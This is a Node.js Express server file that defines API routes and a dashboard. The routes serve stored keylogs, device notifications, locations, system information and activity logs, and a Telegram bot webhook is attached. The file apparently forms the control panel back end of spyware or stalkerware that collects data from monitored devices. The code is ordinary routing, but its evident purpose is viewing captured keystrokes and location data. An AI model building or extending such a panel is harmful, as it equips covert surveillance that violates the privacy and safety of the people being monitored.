const express = require('express');
const path = require('path');
const Logger = require('../utils/Logger');

class WebServer {
    constructor(app, database, telegramBot, monitoringService) {
        this.app = app;
        this.database = database;
        this.telegramBot = telegramBot;
        this.monitoringService = monitoringService;
        this.logger = new Logger();
        
        this.setupRoutes();
    }
    
    setupRoutes() {
        // Health check endpoint
        this.app.get('/health', (req, res) => {
            res.json({
                status: 'healthy',
                timestamp: new Date().toISOString(),
                uptime: process.uptime()
            });
        });
        
        // API routes
        this.app.get('/api/stats', async (req, res) => {
            try {
                const stats = await this.database.getStatistics();
                res.json(stats);
            } catch (error) {
                this.logger.error('Stats API error:', error);
                res.status(500).json({ error: 'Failed to get statistics' });
            }
        });
        
        this.app.get('/api/activity', async (req, res) => {
            try {
                const limit = parseInt(req.query.limit) || 100;
                const logs = await this.database.getActivityLogs(limit);
                res.json(logs);
            } catch (error) {
                this.logger.error('Activity API error:', error);
                res.status(500).json({ error: 'Failed to get activity logs' });
            }
        });
        
        this.app.get('/api/keylogs', async (req, res) => {
            try {
                const limit = parseInt(req.query.limit) || 100;
                const keylogs = await this.database.getKeylogs(limit);
                res.json(keylogs);
            } catch (error) {
                this.logger.error('Keylogs API error:', error);
                res.status(500).json({ error: 'Failed to get keylogs' });
            }
        });
        
        this.app.get('/api/notifications', async (req, res) => {
            try {
                const limit = parseInt(req.query.limit) || 50;
                const notifications = await this.database.getNotifications(limit);
                res.json(notifications);
            } catch (error) {
                this.logger.error('Notifications API error:', error);
                res.status(500).json({ error: 'Failed to get notifications' });
            }
        });
        
        this.app.get('/api/locations', async (req, res) => {
            try {
                const limit = parseInt(req.query.limit) || 50;
                const locations = await this.database.getLocations(limit);
                res.json(locations);
            } catch (error) {
                this.logger.error('Locations API error:', error);
                res.status(500).json({ error: 'Failed to get locations' });
            }
        });
        
        this.app.get('/api/system-info', async (req, res) => {
            try {
                const limit = parseInt(req.query.limit) || 100;
                const sysInfo = await this.database.getSystemInfo(limit);
                res.json(sysInfo);
            } catch (error) {
                this.logger.error('System info API error:', error);
                res.status(500).json({ error: 'Failed to get system info' });
            }
        });
        
        // Webhook endpoint for Telegram bot (production)
        if (process.env.NODE_ENV === 'production') {
            const webhookPath = process.env.WEBHOOK_PATH || '/bot';
            this.app.post(webhookPath, (req, res) => {
                this.telegramBot.bot.processUpdate(req.body);
                res.sendStatus(200);
            });
        }
        
        // Dashboard route
        this.app.get('/', (req, res) => {
            res.sendFile(path.join(__dirname, '../..', 'public', 'index.html'));
        });
        
        // 404 handler
        this.app.use((req, res) => {
            res.status(404).json({ error: 'Not found' });
        });
        
        // Error handler
        this.app.use((err, req, res, next) => {
            this.logger.error('Server error:', err);
            res.status(500).json({ error: 'Internal server error' });
        });
    }
}

module.exports = WebServer;